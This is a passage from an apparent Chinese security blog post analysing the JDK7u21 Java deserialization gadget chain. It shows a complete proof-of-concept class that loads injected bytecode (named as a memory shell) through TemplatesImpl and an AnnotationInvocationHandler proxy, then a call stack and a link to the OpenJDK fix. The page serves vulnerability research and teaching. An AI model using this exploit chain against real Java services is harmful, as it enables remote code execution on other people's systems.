</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">JDK7u21</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        TemplatesImpl templates <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]{</span>
</span></span><span style="display:flex;"><span>                ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>memoryshell<span style="color:#ff79c6">.</span><span style="color:#50fa7b">HelloTemplatesImpl</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">()</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;HelloTemplatesImpl&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         key.equals(?)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         proxy.equals(x)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         CA.CA(x)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         */</span>
</span></span><span style="display:flex;"><span>        Map map<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;f5a5a608&#34;</span><span style="color:#ff79c6">,</span>templates<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Class clazz <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Constructor construct <span style="color:#ff79c6">=</span> clazz<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredConstructor</span><span style="color:#ff79c6">(</span>Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> Map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        construct<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        InvocationHandler handler <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>InvocationHandler<span style="color:#ff79c6">)</span> construct<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span>Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> map<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 把handler.memberMethods设置为getOutputProperties
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Method getOutputPropertiesMethod<span style="color:#ff79c6">=</span>TemplatesImpl<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;getOutputProperties&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>handler<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;memberMethods&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">new</span> Method<span style="color:#ff79c6">[]{</span>getOutputPropertiesMethod<span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>        Object proxy <span style="color:#ff79c6">=</span> Proxy<span style="color:#ff79c6">.</span><span style="color:#50fa7b">newProxyInstance</span><span style="color:#ff79c6">(</span>Name<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClassLoader</span><span style="color:#ff79c6">(),</span> <span style="color:#ff79c6">new</span>
</span></span><span style="display:flex;"><span>                Class<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">{</span>Name<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">},</span> handler<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        下面只需要 proxy.equals(templates);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        HashMap expMap<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        调试发现readObject的时候put的顺序按下面代码的顺序依次从下到上
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        expMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>proxy<span style="color:#ff79c6">,</span>1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        expMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span>1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>expMap<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        deserialize<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><h2 id="调用栈">调用栈</h2>
<pre tabindex="0"><code>getTransletInstance:381, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:410, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
equalsImpl:197, AnnotationInvocationHandler (sun.reflect.annotation)
invoke:59, AnnotationInvocationHandler (sun.reflect.annotation)
equals:-1, $Proxy1 (com.sun.proxy)
putForCreate:522, HashMap (java.util)
readObject:1156, HashMap (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:601, Method (java.lang.reflect)
invokeReadObject:1004, ObjectStreamClass (java.io)
readSerialData:1891, ObjectInputStream (java.io)
readOrdinaryObject:1796, ObjectInputStream (java.io)
readObject0:1348, ObjectInputStream (java.io)
readObject:370, ObjectInputStream (java.io)
</code></pre><h2 id="修复">修复</h2>
<p><a href="https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e">https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e</a></p>
<p>原来只是把函数return，但由于已经defaultReadObject，对反序列化流程没有影响。更新后直接丢异常，寄。</p>

        </p>
    </div>
</div>

<aside class="post-toc">
    <nav id="toc">
        <nav id="TableOfContents">
  <ul>
    <li><a href="#分析">分析</a></li>
    <li><a href="#poc">POC</a></li>
    <li><a href="#调用栈">调用栈</a></li>
    <li><a href="#修复">修复</a></li>
  </ul>
</nav>
    </nav>
</aside>



    

        </main><footer class="footer">
    <span>&copy; 2022 </span>
    <span>
        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
    </span>
</footer>
</body>
</html>
